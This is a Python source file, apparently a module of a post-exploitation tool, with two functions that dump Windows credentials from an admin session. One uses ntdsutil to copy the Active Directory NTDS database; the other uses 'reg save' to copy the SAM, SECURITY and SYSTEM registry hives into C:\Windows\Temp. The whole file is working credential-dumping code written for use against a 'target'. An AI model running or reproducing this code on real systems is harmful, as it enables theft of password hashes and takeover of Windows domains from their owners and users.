from lib.setting import *


# dump windows credentials ######################################################################################
def ntds():
    if os_type == 'windows':
        is_admin = str(ctypes.windll.shell32.IsUserAnAdmin())
        if is_admin == '1':
            try:
                shutil.rmtree("C:\Windows\Temp\copy-ntds")
            except:
                pass
            try:
                DEVNULL = open(os.devnull, 'wb')
                result = str(subprocess.check_output(
                    'ntdsutil "ac i ntds" "ifm" "create full c:\windows\\temp\copy-ntds" quit quit', shell=True,
                    stderr=DEVNULL, stdin=DEVNULL))
                return "\n\033[32m[+]\x1b[0m dumped using ntdsutil, saved in c:\Windows\Temp\copy-ntds \033[32m[+]\n\x1b[0m"
            except:
                return "\n\033[31m[-]\x1b[0m ntds dump failed \033[31m[-]\n\x1b[0m"
        else:
            return "\n\033[31m[+]\x1b[0m permission denied, your not running as admin \033[31m[+]\n\n\x1b[0m"
    else:
        return "\n\033[33m[!]\x1b[0m target is not a windows machine  \033[33m[!]\n\x1b[0m"


def reg_save():
    if os_type == 'windows':
        is_admin = str(ctypes.windll.shell32.IsUserAnAdmin())
        if is_admin == '1':
            try:
                os.remove('C:\Windows\Temp\sam.save')
            except:
                pass
            try:
                os.remove('C:\Windows\Temp\security.save')
            except:
                pass
            try:
                os.remove('C:\Windows\Temp\system.save')
            except:
                pass
            try:
                subprocess.call('reg save hklm\sam C:\Windows\Temp\sam.save', shell=True)
                subprocess.call('reg save hklm\security C:\Windows\Temp\security.save', shell=True)
                subprocess.call('reg save hklm\system C:\Windows\Temp\system.save', shell=True)
                return "\n\033[32m[+]\x1b[0m dumped using reg save, saved in C:\Windows\Temp\sam.save, system.save , security.save \033[32m[+]\n\x1b[0m"
            except:
                return "\n\033[31m[-]\x1b[0m reg-save dump failed \033[31m[-]\n\x1b[0m"
        else:
            return "\n\033[31m[+]\x1b[0m permission denied, your not running as admin \033[31m[+]\n\x1b[0m"
    else:
        return "\n\033[33m[!]\x1b[0m target is not a windows machine  \033[33m[!]\n\x1b[0m"